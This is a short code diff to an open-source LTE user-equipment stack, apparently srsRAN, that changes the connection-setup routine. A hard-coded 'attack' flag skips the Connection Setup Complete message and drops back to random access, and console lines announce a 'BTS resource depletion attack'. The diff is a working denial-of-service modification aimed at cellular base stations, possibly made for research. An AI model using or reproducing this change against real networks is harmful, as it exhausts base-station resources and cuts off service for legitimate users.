@@ -1023,7 +1023,15 @@ void rrc::send_con_setup_complete(srsran::unique_byte_buffer_t nas_msg)
   rrc_conn_setup_complete->ded_info_nas.resize(nas_msg->N_bytes);
   memcpy(rrc_conn_setup_complete->ded_info_nas.data(), nas_msg->msg, nas_msg->N_bytes); // TODO Check!
 
-  send_ul_dcch_msg(srb_to_lcid(lte_srb::srb1), ul_dcch_msg);
+  int attack = 1; 
+  if (attack) {
+    srsran::console("[Testtt] Simulating BTS resource depletion attack\n");
+    srsran::console("[Testtt] Restarting RA procedure\n");
+    rrc::leave_connected();
+  }
+  else {
+    send_ul_dcch_msg(srb_to_lcid(lte_srb::srb1), ul_dcch_msg);
+  }
 }
 
 void rrc::send_ul_info_transfer(unique_byte_buffer_t nas_msg)
